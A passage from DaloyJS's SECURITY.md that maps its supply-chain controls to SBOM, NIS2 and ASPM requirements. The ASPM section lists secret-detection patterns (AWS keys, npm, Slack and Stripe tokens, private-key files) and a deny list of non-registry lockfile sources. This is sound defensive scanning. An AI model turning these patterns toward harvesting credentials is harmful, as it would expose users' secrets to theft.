| **SPDX 2.3 ("Linux-Foundation / ISO/IEC 5962, required by US EO 14028 / NTIA minimum elements")** | The same script emits `dist/sbom.spdx.json` / `packages/create-daloy/sbom.spdx.json` alongside the CycloneDX file. The document declares `spdxVersion: "SPDX-2.3"`, `dataLicense: "CC0-1.0"`, a stable `documentNamespace` rooted at the project's GitHub URL, a `packages` array whose first entry is the published artifact (with `versionInfo`, `licenseConcluded`, `licenseDeclared`, `supplier`, `copyrightText`, and a `purl` external ref), and a `relationships` array including the `SPDXRef-DOCUMENT DESCRIBES <root>` edge plus one `DEPENDS_ON` edge per runtime dep. Same zero-runtime-deps invariant: for `@daloyjs/core`, the packages array contains exactly one entry. |
| **SWID (ISO/IEC 19770-2, asset-management identifier)** | SWID is an identifier format rather than a Node-native SBOM format, so emitting a standalone `.swidtag` file would be overhead without consumers. CycloneDX 1.5 explicitly supports SWID interop via `components[].swid`; we use that and embed a deterministic SWID tag-id (`swidtag-<sanitised-name>-<version>`) inside the CycloneDX document's primary component. Asset-management platforms that key off SWID tags (ITAM, ITSM) can therefore match the same artifact without a separate file. |
| **"The SBOM must live next to the artifact, not in a vendor portal."** | The SBOM files are listed in each package's `files` array (`dist/` is whitelisted for `@daloyjs/core`; `sbom.cdx.json` + `sbom.spdx.json` are whitelisted for `create-daloy`). They ship inside the npm tarball, so any consumer who runs `pnpm install @daloyjs/core` already has the SBOM on disk under `node_modules/@daloyjs/core/dist/sbom.cdx.json` — no API call, no vendor account, no rate limit. The same npm `--provenance` Sigstore attestation that binds the tarball bytes to the source commit therefore also binds the SBOM bytes transitively, so a consumer who verifies the provenance is also verifying the SBOM. |
| **"The SBOM must be generated as part of CI/CD, not by a one-off vendor scan."** | `pnpm gen:sbom` runs in [`ci.yml`](.github/workflows/ci.yml) after `pnpm build` (so the dist tree exists), and again in **every** `verify` + `publish-*` job in [`release.yml`](.github/workflows/release.yml). `pnpm verify:sbom` runs immediately afterwards and refuses to publish if the SBOM is missing, the primary-component name/version drifts from `package.json`, the format / spec version is wrong, or — for `@daloyjs/core` — any runtime component is present. Reproducibility: a `SOURCE_DATE_EPOCH` env var (set by the release runner) freezes the SBOM `timestamp` / `created` field so two runs against the same source produce byte-identical SBOMs. |
| **"The SBOM must include licence information for every component."** | The CycloneDX primary component declares `licenses[0].license.id` from `package.json#license`. The SPDX root package declares both `licenseConcluded` and `licenseDeclared`. Dependency entries fall back to `NOASSERTION` (the SPDX-mandated sentinel) when the upstream registry does not publish a `license` field. |
| **"The SBOM must be machine-checkable against the manifest."** | [`scripts/verify-sbom.ts`](scripts/verify-sbom.ts) is the gate: it parses each SBOM, compares the primary-component name / version against `package.json`, compares the `components` / `packages` array against `package.json#dependencies` (sorted), and refuses with a structured error per mismatch. Wired into [`ci.yml`](.github/workflows/ci.yml), the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml), and both `publish-core` / `publish-create-daloy` jobs so a stale or missing SBOM blocks `pnpm publish` before any bytes reach the registry. Regression coverage in [`tests/sbom.test.ts`](tests/sbom.test.ts) (11 tests) locks the format, the deterministic serial-number derivation, the SPDX root-package mapping, the missing-SBOM failure, the unexpected-component failure, and the version-drift failure. |

What this **does not** defend against, said explicitly so operators do not
mis-scope the claim:

- **The consumer's *application* SBOM.** Daloy emits a framework-side SBOM
  for the bytes it publishes; aggregating that with the SBOMs of every
  other package the application installs (and shipping the union to a
  procurement portal) is an operator-side concern. Combine our SBOM with
  `pnpm exec @cyclonedx/cdxgen` or `syft` against the consumer's `node_modules`
  to produce the application-wide SBOM the regulator wants to see.
- **SBOM signing as a separate Sigstore bundle.** The npm `--provenance`
  attestation binds the *entire* tarball (including the SBOM files inside
  it) to the source commit, which is functionally equivalent for the
  framework's use case. A standalone `attest-sbom` Sigstore bundle per
  release is on the Hardening roadmap as part of the SLSA L3 work.
- **Continuously-updated SBOMs for already-published versions.** SBOMs are
  generated at publish time and frozen with the tarball. If a transitive
  CVE is later disclosed, the daily `pnpm audit --prod`
  ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml)) is
  the live signal; the SBOM is the dependency-inventory of record.

### Aikido NIS2 vulnerability-patching mapping (Article 21 procurement clauses)

Aikido's 2025-01-14 write-up
["Your Client Requires NIS2 Vulnerability Patching. Now What?"](https://www.aikido.dev/blog/your-client-requires-nis2-vulnerability-patching-now-what)
documents the now-standard procurement-contract clauses EU enterprises are
pushing down to every supplier under Article 21 of the NIS2 directive
(transposed into national law across the EU through 2024/2025): explicit
severity-keyed patch SLAs measured from patch-availability, three-timestamp
documentation per advisory (discovered / patch-available / deployed),
continuous (daily) vulnerability scanning, and a documented vulnerability-
management process the buyer can audit. DaloyJS is an upstream npm package,
not an end-user service, so we cannot satisfy NIS2 on the consumer's behalf
— but every primitive a NIS2-regulated consumer needs from an upstream
dependency to answer their own procurement audit is shipped today. The
mapping below is explicit so a Daloy consumer who receives the email from
the article ("all software components used for delivering the services must
be patched within the following timeframes…") can answer per-clause from a
single link instead of an internal investigation.

| NIS2 procurement-clause requirement (Aikido article) | DaloyJS control |
| --- | --- |
| **Patch SLA — Critical 48 h / High 7 d / Medium 30 d / Low 90 d**, measured from patch-availability | The upstream patch-release SLA in § Patch SLA above commits to **identical** windows (Critical 48 h, High 7 d, Medium 30 d, Low 90 d) for confirmed in-scope vulnerabilities in `@daloyjs/core` and `create-daloy`, measured from triage confirmation. The consumer's downstream deploy window is the consumer's responsibility, but the upstream patch will be available inside the same window the consumer's contract names. |
| **Three-timestamp documentation per advisory** — when discovered, when patch became available, when deployed | Every GitHub Security Advisory we publish carries the discovered date and the fixed-version publish timestamp (§ Evidence produced per advisory). The fixed-version publish timestamp is bound to the source commit and the `release.yml` workflow run via the npm `--provenance` Sigstore attestation on the Rekor transparency log, so the "patch available" timestamp is publicly verifiable without a vendor portal. The consumer's "deployed" timestamp is their lockfile diff (`pnpm-lock.yaml` blame on the `@daloyjs/core` line). |
| **Continuous vulnerability scanning — "most companies interpret this as daily"** | The daily SCA workflow ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml), 06:13 UTC) runs `pnpm audit --prod` against the committed lockfile on a fixed schedule, independent of PR/push activity, so newly-disclosed CVEs in pinned dependencies are surfaced even on quiet days — the same cadence Aikido recommends and the SOC 2 CC7.1 "continuous monitoring" baseline (§ CI/CD). OpenSSF Scorecard publishes a continuous score and CodeQL re-scans on schedule. |
| **CVE monitoring for every component in the stack** | The CycloneDX 1.5 (`dist/sbom.cdx.json`) and SPDX 2.3 (`dist/sbom.spdx.json`) SBOMs ship inside every `@daloyjs/core` / `create-daloy` tarball (§ Aikido SBOM-standards mapping), with purls (`pkg:npm/<name>@<version>`) for every runtime component, so a consumer's SCA can match published CVEs against the exact versions actually installed. `@daloyjs/core` declares **zero runtime dependencies**, so the framework's contribution to that match-set is empty by construction. |
| **Documented vulnerability-management process the buyer can audit** | This `SECURITY.md` is the documented process: § Reporting a Vulnerability (private channel via GitHub Security Advisories), § Response Target (acknowledgement / triage / patch SLA), § Evidence produced per advisory (three-timestamp documentation), § Recurring security-disclosure exercise (quarterly re-verification), § Maintainer accounts (mandatory hardware-backed 2FA), and § Governance floor (CI gates that refuse to remove any control). The whole file is version-controlled, signed-commit history is on GitHub, and the active rotation in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) is enforced by the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml). |
| **Evidence of compliance through automated tracking** | The CI gate stack runs on every PR, every push to `main`, and inside the publish job — `pnpm verify:governance-audits`, `verify:lockfile`, `verify:no-runtime-deps`, `verify:no-lifecycle-scripts`, `verify:no-remote-exec`, `verify:actions-pinned`, `verify:sbom`, `verify:no-leaked-credentials`, `verify:no-invisible-unicode`, etc. Every run is publicly visible in the GitHub Actions tab. The npm `--provenance` Sigstore attestation on every published tarball is the cryptographic evidence that the bytes were produced by the public workflow — auditable without trusting any private dashboard. |
| **Regular status updates on remediation efforts** | GitHub Security Advisories transition through `draft → published`, list the fixed version, and are surfaced to `pnpm audit` consumers immediately. Each advisory links the underlying PR and the npm publish URL with its provenance attestation. For incidents that affect more than one release line, [`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) carries a one-line bullet at the top so the timeline is append-only and reviewable. |
| **Risk-management measures — severity assessment, remediation tracking, justified delays, SLA reporting** | Severity assessment uses CVSS v3.1 (vector + base score in every GHSA). Remediation tracking is the GHSA + linked PR + linked release. Justified delays carry a visible `slo-breach: …` note in the GHSA when an SLA window slips, so the cause is on the record. The recurring quarterly disclosure exercise (§ Recurring security-disclosure exercise) re-verifies that the inbox, the active rotation, the `npm-publish` Environment, the governance gate, and the active contacts' recovery-email domains are all still working — a missed quarter fails CI loud. |
| **Supply-chain security pushdown** (NIS2 Article 21 §2(d): "supply chain security, including security-related aspects concerning the relationships between each entity and its direct suppliers or service providers") | Every per-incident mapping in this file (Snyk's foundational pattern, shopsprint, IR.* NuGet, axios 2026, node-ipc 2026-05-14, Lightning / Shai-Hulud, GlassWorm, Lazarus BeaverTail, RATatouille, xrpl, Telegram-bot, advcash, fast-draft / BlokTrooper, Aikido "Malware Dating Guide") is the granular supply-chain-security evidence a NIS2 buyer can cite when their own procurement asks "what does your upstream framework do about supply-chain attacks". Zero runtime deps in `@daloyjs/core` (`pnpm verify:no-runtime-deps`), `ignore-scripts=true` + `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc`, SHA-pinned third-party Actions, `step-security/harden-runner` egress block on publish, and npm Trusted Publishing (OIDC) with no long-lived `NPM_TOKEN` are the framework-level controls; the per-incident tables are the regression-tested proof. |

What this **does not** defend against, said explicitly so operators do
not mis-scope the claim:

- **NIS2 compliance for the consumer's own service.** NIS2 obligations
  attach to the consumer (the "essential" or "important" entity providing
  the service), not to upstream framework authors. DaloyJS gives a
  consumer the upstream evidence they need to answer one item in their
  procurement audit; the rest of their dependency tree, their own
  application code, their cloud configuration, their incident-reporting
  process to the national CSIRT (24 h early warning, 72 h notification,
  1-month final report under Article 23), and their staff training are
  the consumer's responsibility.
- **A patch SLA on vulnerabilities that turn out not to be in
  `@daloyjs/core` or `create-daloy`.** Reports that resolve to user code,
  to a misconfigured handler, to a non-Daloy third-party dependency the
  consumer installed, or to "won't fix" decisions (e.g. an out-of-scope
  request from § Explicitly out of scope) do not consume the SLA timer.
  We will say so in the triage response and link to the relevant
  in-scope/out-of-scope row.
- **Procurement-portal integration.** We publish GitHub Security
  Advisories, the npm registry's vulnerability metadata, and an SBOM in
  every tarball. Mapping that into a buyer's specific procurement portal
  (Aikido, OneTrust, ServiceNow GRC, etc.) is the buyer's integration
  work; we deliberately do not vend a portal or an API key.

If a future NIS2-aligned procurement clause names a control the framework
should support and currently does not, treat the gap as a release-blocking
bug and open a private advisory.

### Aikido ASPM features-and-capabilities mapping

Aikido's [ASPM (Application Security Posture Management) features and
capabilities](https://www.aikido.dev/blog/aspm-features-and-capabilities)
write-up enumerates the modern AppSec-platform feature set that consolidates
what used to be a dozen disjoint point tools (SAST, SCA, secrets, IaC,
containers, DAST, license, malware, SBOM, CI/CD security, reachability,
risk-based prioritization, autotriage/autofix, runtime / cloud posture) into
a single posture-management surface. DaloyJS is an upstream backend
framework, not an ASPM platform — we do **not** vend a dashboard, an agent,
or a buyer-side correlation/triage UI, and we deliberately do not try to
become one. What we **do** ship is the upstream half of every ASPM
capability so that a consumer who installs `@daloyjs/core` / scaffolds with
`create-daloy` already gets the framework-side guarantees an ASPM platform
would otherwise have to detect, prioritize, and remediate after-the-fact.
The table below is the explicit per-capability mapping so an operator
evaluating Daloy against the article (or against a procurement RFP whose
"ASPM coverage" checklist comes from it) can answer "is this already
covered upstream?" without re-reading the surrounding sections.

| ASPM capability (Aikido article) | DaloyJS contribution |
| --- | --- |
| **Static Application Security Testing (SAST)** — find vulnerabilities in first-party source code before it ships. | Two SAST engines run on every PR and push to `main`: **CodeQL** ([`.github/workflows/codeql.yml`](.github/workflows/codeql.yml)) for JavaScript/TypeScript and GitHub Actions queries, and **Opengrep** (Aikido's LGPL-2.1 fork of Semgrep, cosign-verified release binary, [`.github/workflows/opengrep.yml`](.github/workflows/opengrep.yml)) with the `p/security-audit`, `p/owasp-top-ten`, `p/cwe-top-25`, `p/javascript`, `p/typescript`, `p/nodejs`, and `p/secrets` rule packs against `src/`, `scripts/`, `examples/`, `bin/`, `tests/`, and `packages/`. Layered on top are the framework-specific static gates in [`scripts/`](scripts) (`verify:no-remote-exec`, `verify:no-encoded-payloads`, `verify:no-invisible-unicode`, `verify:no-vulnerable-sandboxes`, `verify:no-registry-exfiltration`, `verify:no-unsafe-buffer`, `verify:secret-comparisons`, `verify:no-bin-shadowing`, `verify:parity-audits` / `verify:governance-audits` / `verify:runtime-parity-audits` / `verify:routing-hardening-audits`) that catch Daloy-specific anti-patterns the generic SAST engines cannot model. |
| **Software Composition Analysis (SCA)** — find known CVEs in third-party dependencies. | `@daloyjs/core` declares **zero runtime dependencies** ([`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)), so the SCA surface a consumer inherits from `@daloyjs/core` is empty. For the dev/test tree, **two independent advisory feeds** are run on a fixed schedule so a finding that appears in only one DB still surfaces: **(a)** the daily [`vuln-scan.yml`](.github/workflows/vuln-scan.yml) workflow runs `pnpm audit --prod` against the committed `pnpm-lock.yaml` (GitHub Advisory Database) on the SOC 2 CC7.1 continuous-monitoring cadence described in Aikido's [SOC 2 automation guide](https://www.aikido.dev/blog/a-guide-to-automating-technical-vulnerability-management-for-soc-2); **(b)** the daily [`osv-scan.yml`](.github/workflows/osv-scan.yml) workflow runs Google's `osv-scanner` (binary SHA-256-verified before execution) against the same lockfile, querying [OSV.dev](https://osv.dev/) plus the OpenSSF [`malicious-packages`](https://github.com/ossf/malicious-packages) corpus. This is the "second-source" layer Aikido's [npm-audit-guide](https://www.aikido.dev/blog/npm-audit-guide) calls "the missing layer" — a single advisory feed missed the September 2025 `debug` / `chalk` maintainer-phishing wave (~2B downloads/week of dependents) until well after it was indexed in the malicious-packages corpus. [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) refuses any lockfile entry resolved from a non-registry source (`git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, or any tarball URL outside `registry.npmjs.org`), so both scanners' DBs can actually match what is installed. Dependabot ([`.github/dependabot.yml`](.github/dependabot.yml)) opens weekly PRs for both npm and GitHub Actions, closing the autoremediation half of the SCA loop. |
| **Secrets detection** — find committed credentials in source and in built artifacts. | Three layers. **(a)** GitHub-native push protection is enabled on the repository. **(b)** `gitleaks` ([`.github/workflows/secret-scan.yml`](.github/workflows/secret-scan.yml)) runs on every PR and push against the working tree plus a daily sweep of the full git history (binary SHA-256-verified before execution, so the trust surface is a pinned hash rather than a third-party Action). **(c)** [`pnpm verify:no-leaked-credentials`](scripts/verify-no-leaked-credentials.ts) runs on the assembled tarball inside both publish jobs of [`release.yml`](.github/workflows/release.yml) and refuses any `.env*` / `id_rsa*` / `*.pem` / `*.key` / `*.p12` / `*.pfx` / `.npmrc` / `.netrc` / `credentials*.json` / `secrets*.json` / `service-account*.json` / `*.kdbx` plus content scans for AWS access keys (`AKIA…`), GitHub PATs / OAuth / fine-grained tokens, npm tokens (`npm_…`), Slack tokens (`xox?-…`), Stripe live secret keys (`sk_live_…`), Google API keys (`AIza…`), JWT-shaped strings, PEM private-key blocks, and `_authToken=` lines. |
| **Infrastructure-as-Code (IaC) scanning** — find misconfigurations in Dockerfiles, Kubernetes manifests, Terraform, etc. | The scaffolded [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) workflow shipped by `create-daloy` runs **hadolint** (CIS Docker Benchmark coverage on the Dockerfile), **Trivy filesystem** (config + secrets + vulnerable lockfile entries, SARIF to Code Scanning), and **Trivy image** (OS + language CVEs) on every PR, every push to `main`, and on a weekly cron. The scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) prescribes the runtime hardening flags (`--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges:true`, `--security-opt=seccomp=default`, `--pids-limit=256`, `--memory` / `--cpus`, `--tmpfs /tmp:rw,noexec,nosuid`) plus the Kubernetes equivalents (`runAsNonRoot`, `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, `capabilities: { drop: ["ALL"] }`, `automountServiceAccountToken: false`). See the **Aikido x Root.io** and **Container Security — The Dev Guide** mappings above for the full per-row breakdown. |
| **Container & base-image scanning** — find OS-level CVEs and configuration issues in container images. | Same `container-scan.yml` workflow above; **Trivy image** scans with `severity: HIGH,CRITICAL` and `vuln-type: os,library`, blocking on CRITICAL by default. The scaffolded `_Dockerfile` is two-stage with a minimal Alpine runner (`apk add --no-cache tini` only — no `curl`, no `bash`, no compiler), runs as non-root UID 1001 under `tini` as PID 1, with `STOPSIGNAL SIGTERM` wired to the framework's graceful-shutdown drain and `HEALTHCHECK` wired to `app.readinesscheck()`. A `NODE_IMAGE` build-arg supports `node:24-alpine@sha256:<digest>` pinning, and the scaffolded [`dependabot.yml`](packages/create-daloy/templates/_ci/node/_github/dependabot.yml) registers the `docker` ecosystem so digest pins stay fresh. The container-scan workflow now also runs a **Pin check (FROM @sha256 digest)** step that emits a `::warning` PR annotation for every unpinned `FROM` line. |
| **Dynamic Application Security Testing (DAST)** — exercise the running application from the outside. | The weekly [`dast.yml`](.github/workflows/dast.yml) workflow runs the **OWASP ZAP baseline scan** against the bookstore example on a real listening server. This closes the dynamic half of the [Aikido SAST-vs-DAST guidance](https://www.aikido.dev/blog/sast-vs-dast-what-you-need-to-now) for the framework surface — every gate that runs at request time (body-size cap, header CRLF/NUL rejection, router path-traversal rejection, real 405, per-handler timeout, `secureHeaders()`, CSRF, rate limit, content-type allowlist) is exercised against a real HTTP client, not just a unit test. |
| **License compliance** — flag GPL / AGPL / non-permissive licenses in the dependency tree before they ship. | [`pnpm verify:dep-licenses`](scripts/verify-dep-licenses.ts) walks the resolved dependency tree and refuses any non-allowlisted license (the allowlist defaults to permissive: MIT, ISC, BSD-2-Clause / BSD-3-Clause, Apache-2.0, 0BSD, CC0-1.0, Unlicense, Python-2.0, and a small handful of dual-licensed dev tools). Runs in [`ci.yml`](.github/workflows/ci.yml) and in both publish jobs of [`release.yml`](.github/workflows/release.yml). |
| **Malware-in-dependencies detection** — catch hijacked packages, typosquats, install-time payloads, and runtime trojans. | The framework's most extensive defense lobe — see the **Socket "Inside your node_modules"**, **Socket "vulnerability scanning isn't enough"**, **Socket "limitations of CVE-based scanners"** mappings above and the per-incident regression rows in the threat-model table (BlokTrooper, RATatouille, GemStuffer, Lazarus / BeaverTail / InvisibleFerret, xrpl.js, Telegram-bot SSH backdoor, Advcash reverse shell, GlassWorm, TanStack 2026-05-11, chalk/debug, node-ipc, ua-parser-js, event-stream, fast-draft, Shai-Hulud, the Aikido "Malware Dating Guide" three archetypes). Combined: `ignore-scripts=true` + `minimum-release-age=1440` in root [`.npmrc`](.npmrc) and every template `_npmrc`, `verify:no-remote-exec`, `verify:no-encoded-payloads`, `verify:no-invisible-unicode`, `verify:no-vulnerable-sandboxes`, `verify:no-registry-exfiltration`, `verify:no-unsafe-buffer`, `verify:no-lifecycle-scripts`, `verify:lockfile-sources` (with Lazarus-typosquat blocklist), and the zero-runtime-deps invariant. |
| **CI/CD pipeline security** — catch malicious / misconfigured workflows, prevent secret exfiltration from runners. | `zizmor` ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)) statically analyses every workflow on every PR. [`scripts/verify-actions-pinned.ts`](scripts/verify-actions-pinned.ts) refuses any third-party `uses:` line that is not a 40-character lowercase hex commit SHA, that interpolates a `${{ … }}` expression, or that references a known-compromised action (currently `tj-actions/changed-files` per [CVE-2025-30066](https://nvd.nist.gov/vuln/detail/CVE-2025-30066) and `reviewdog/action-setup` per CVE-2025-30154). `step-security/harden-runner` runs in `block` egress mode on both publish jobs with an explicit allowlist of `registry.npmjs.org`, `api.github.com`, `github.com`, `objects.githubusercontent.com`, and the Sigstore endpoints; the `verify` job and CI workflow run in `audit` mode. Top-level `permissions: {}` in every workflow; jobs opt in to the minimum scopes they need. `actions/checkout` runs with `persist-credentials: false`. No `pull_request_target` anywhere in the repo. No GitHub Actions cache shared between fork PRs and `main`. The full mapping against Aikido's ["Preventing fallout from your CI/CD platform being hacked"](https://www.aikido.dev/blog/prevent-fallout-when-cicd-platform-hacked) lives under **CI/CD platform compromise** above. |
| **Software Bill of Materials (SBOM)** — machine-readable inventory of what's in every published artifact. | Every `@daloyjs/core` and `create-daloy` tarball ships a **CycloneDX 1.5** (`dist/sbom.cdx.json`) and **SPDX 2.3** (`dist/sbom.spdx.json`) SBOM generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and locked at release time by [`pnpm verify:sbom`](scripts/verify-sbom.ts), with a SWID tag embedded inside the CycloneDX document for ISO/IEC 19770-2 asset-management interop. The `@daloyjs/core` SBOM has zero `components` / `packages` entries (the zero-runtime-deps invariant re-checked from the SBOM bytes). Reproducible: a `SOURCE_DATE_EPOCH` env var freezes the timestamp so two runs against the same source produce byte-identical SBOMs. See the full **Aikido SBOM-standards mapping** above. |
| **Build / artifact provenance & attestation (SLSA-aligned)** — prove the published bytes came from the public source commit and CI run. | Every published tarball carries an `npm provenance` Sigstore attestation (root [`.npmrc`](.npmrc) sets `provenance=true`) bound to the source commit and the `release.yml` workflow run via npm Trusted Publishing (OIDC). The attestation is publicly verifiable on the npm package page and on the Rekor transparency log without trusting a vendor portal. SLSA build-level-3 attestations beyond the existing provenance are tracked on the Hardening roadmap. |
| **Reachability analysis / risk-based prioritization** — filter CVEs by whether the vulnerable code path is actually exercised. | We approach this by **shrinking the surface so reachability is trivial to compute**, rather than by bundling a runtime reachability engine. `@daloyjs/core` has zero runtime dependencies, so the framework contribution to a consumer's reachable surface is exactly the framework's own source (publicly browsable, statically analysed by two SAST engines + the `verify:*` family). Consumers who want application-side reachability scoring should pair Daloy with their existing ASPM tool (Aikido, Snyk Reachability, Socket); the framework's job is to make sure the upstream surface those tools score is as small as possible. |
| **Autoremediation / autofix (Dependabot / Aikido AutoFix)** — open PRs that bump fixed versions automatically. | [`.github/dependabot.yml`](.github/dependabot.yml) opens weekly PRs for the npm and GitHub Actions ecosystems (and, for the scaffolded container template, the `docker` ecosystem) so newly-disclosed CVEs in pinned deps and unpinned base-image digests get an automatic remediation PR. CODEOWNERS gates merges on `.github/`, `package.json`, the lockfile, and `.npmrc`. |
| **Vulnerability correlation & deduplication across scanners** | This is an ASPM-platform feature by definition (it correlates findings from the buyer's own SAST + SCA + secrets + IaC + DAST + container scanners), not something a single upstream framework can provide. What the framework can do, and does, is publish each finding once with stable identifiers: every confirmed vulnerability gets a single GitHub Security Advisory (GHSA), a CVE through GitHub's CNA, the three NIS2 timestamps (discovered / patch-available / deployed), a CVSS v3.1 vector, the affected version range, and the fixed version, all bound to the SBOM bytes via the npm provenance attestation. A correlator on the buyer side has exactly one upstream record to dedupe against per advisory. See the **NIS2 procurement** mapping above. |
| **AutoTriage (LLM-assisted ranking)** | Not something the upstream framework can provide for the consumer's application. The framework's contribution is making the upstream half of the input deterministic: every advisory carries a single GHSA + CVE pair, a CVSS vector, an affected/fixed version range, and SBOM-bound provenance — so a downstream AutoTriage classifier sees structured input, not free-text. |
| **Continuous monitoring (don't just scan at PR time)** | The daily `pnpm audit --prod` job ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml)) runs against the committed lockfile on a fixed schedule (06:13 UTC), independent of PR/push activity, so newly-disclosed CVEs in pinned dependencies are surfaced even on quiet days. OpenSSF Scorecard ([`.github/workflows/scorecard.yml`](.github/workflows/scorecard.yml)) publishes a continuous score. CodeQL re-scans on schedule. The scaffolded `container-scan.yml` workflow has a weekly cron so base-image CVEs disclosed after the last PR are caught. |
| **Cloud / runtime posture (CSPM, CWPP)** | Out of scope for an upstream HTTP framework. We ship the runtime hardening primitives that a CSPM tool would otherwise have to detect after-the-fact (`secureHeaders()`, `csrf()`, `rateLimit()`, `loadShedding()`, `fetchGuard()` SSRF egress filter, `ipRestriction()`, signed-cookie `session()`, `jwt()` + JWKS rotation, core body-size cap + request-timeout + connection drain, `app.healthcheck()` / `app.readinesscheck()`, `app({ behindProxy })`, the `daloy doctor` posture validator) plus the scaffolded container hardening (non-root, `tini`, `--read-only` / `--cap-drop=ALL` / `--security-opt=no-new-privileges` recipe in the template `SECURITY.md`). Operators should pair Daloy with a real CSPM tool (Aikido, Wiz, Orca, Lacework, …) for the AWS / GCP / Azure misconfiguration half. |
| **Compliance & audit reporting (SOC 2 CC7.1, ISO 27001 A.12.6.1, EU CRA, NIS2 Article 21)** | The daily `pnpm audit --prod` cadence is the SOC 2 CC7.1 continuous-vulnerability-management evidence. The NIS2 Article 21 procurement obligations are mapped row-by-row above (severity-keyed patch SLAs, three-timestamp advisories, Sigstore-bound provenance for "patch available"). The published CycloneDX 1.5 + SPDX 2.3 SBOMs satisfy the US EO 14028 / NTIA minimum SBOM elements. The Aikido **Package Health** five-category mapping above (Dependencies, Maintainer Stability, Maturity, Supply-Chain Scripts, Attestations) is the per-category answer to procurement RFPs that ask "show your work" for each ASPM column. |
| **OWASP API Security Top 10 (2023) coverage** | Already mapped end-to-end in the threat-model table above (API1 BOLA / API2 Broken Authentication / API3 BOPLA / API4 Unrestricted Resource Consumption / API5 Broken Function-Level Auth / API6 Unrestricted Access to Sensitive Business Flows / API7 SSRF / API8 Security Misconfiguration / API9 Improper Inventory Management / API10 Unsafe Consumption of APIs). The "Aikido Cloud Application Security" four-pillar mapping in the threat-model table shows the same primitives mapped against the Shift-Left / Secure APIs / Harden Runtime / Manage Access pillars. |

What this **does not** defend against, said explicitly so operators do not
mis-scope the claim:

- **An ASPM dashboard / correlation UI / triage workflow for the
  consumer's application.** Daloy does not vend one and is not on the
  roadmap to. Pair Daloy with an actual ASPM platform (Aikido, Snyk,
  Wiz, Orca, GitHub Advanced Security) for the buyer-side correlation,
  prioritization, and remediation-workflow layer. The framework's job
  is to make every gate the ASPM platform would otherwise need to
  detect already enforced upstream.
- **Cloud-account posture (CSPM)** — IAM misconfigurations, S3 / GCS
  bucket policies, security-group ingress rules, KMS key rotation,
  cross-account trust, public network exposure. These live below the
  framework layer and are the right thing for a CSPM tool to own.
- **Runtime threat detection / behavioral analytics (CWPP / RASP)** —
  attaching an agent to the running Node process, hooking syscalls,
  detecting in-process attacks at request time. Daloy is a framework,
  not an agent; the request-time defenses we ship (input validation,
  body cap, timeouts, SSRF egress, secure-by-default headers, CSRF,
  rate limit) are preventive, not detective. Operators who need runtime
  detection should layer a CWPP / RASP product (Aikido Zen, Sqreen-era
  successors, …) on top.
- **Reachability scoring against the consumer's own first-party
  code paths.** The framework can keep its own surface small (zero
  runtime deps, public source, two SAST engines + `verify:*` family)
  so a buyer-side reachability engine has a tractable upstream to
  analyze; we cannot score the consumer's handler tree for them.

If a future ASPM capability in the Aikido catalog maps onto a class of
attack the framework should defend against and currently does not, treat
the gap as a release-blocking bug and open a private advisory.

### Governance floor (reaffirmed)

Every supply-chain control listed above is the documented governance floor.
Removal of any one of these requires an explicit `SECURITY.md` entry
justifying the removal and a maintainer-quorum sign-off on the PR. The
static gate that enforces this lives in
[`scripts/verify-governance-audits.ts`](scripts/verify-governance-audits.ts) and runs
in CI as `pnpm verify:governance-audits`. It refuses a PR that:

- removes the top-level `permissions:` block from a workflow,
- removes `persist-credentials: false` from an `actions/checkout` call,
- replaces a SHA-pinned third-party action with a tag or branch reference,
- drops `step-security/harden-runner` from a workflow that uses third-party
  actions,
- adds a runtime dep to `@daloyjs/core/package.json` (zero-runtime-dep
  posture, also reaffirmed by the auth-helper hardening pass),
- removes the plugin-prerequisite refuse-to-boot path or the
  `topoSortExtensions` cycle-detection throw from `src/app.ts`, or
- removes `SECURITY-CONTACTS.md` or `.github/CODEOWNERS`.

### Recurring security-disclosure exercise

The disclosure rotation is documented in
[`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) and tested at least once per
quarter with a simulated report. Each exercise verifies that:

1. The private vulnerability-report inbox is monitored within the
   3-business-day acknowledgement target documented earlier in this file.
2. Every handle in the **Active** rotation can authenticate to GitHub and
   npm with hardware-backed 2FA.
3. The protected `npm-publish` GitHub Environment still requires explicit
   approval before any publish job executes.
4. `pnpm verify:governance-audits` exits zero on `main`.
5. The GitHub and npm account-recovery email address for every handle in
   the **Active** rotation still resolves to a domain the contact
   personally owns, or to a custodial provider where the contact still has
   an active account. (Added 2026-05-20 in response to the `node-ipc`
   2026-05-14 reload, where a dormant maintainer was compromised via a
   lapsed recovery-email domain — see `otherdocs/security-incidence.md`.)

The most recent exercise is recorded as a one-line bullet in
[`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) using the form
"`_<date>_ — disclosure exercise completed.`" plus a short summary
of findings. The audit script reads the
`<!-- last-exercise: YYYY-MM-DD -->` marker in `SECURITY-CONTACTS.md` and
refuses with a non-zero exit when the date is older than 180 days, so a
missed quarter fails CI loud instead of silently aging out.

### Stolen-credential malicious republish (foundational Snyk pattern)

Snyk's foundational write-up
[How to prevent malicious packages](https://snyk.io/blog/publishing-malicious-packages/)
documents the original five-step npm-publish attack — every later incident
in this section (chalk/debug, node-ipc, axios, shopsprint, Lightning,
Shai-Hulud) is a variant of it. We list the canonical steps here with the
specific Daloy / template control that catches each one, so reviewers do
not have to cross-reference the per-incident tables to confirm the
foundational class is covered.

| Snyk attack step (2016 write-up) | DaloyJS / template control |
| --- | --- |
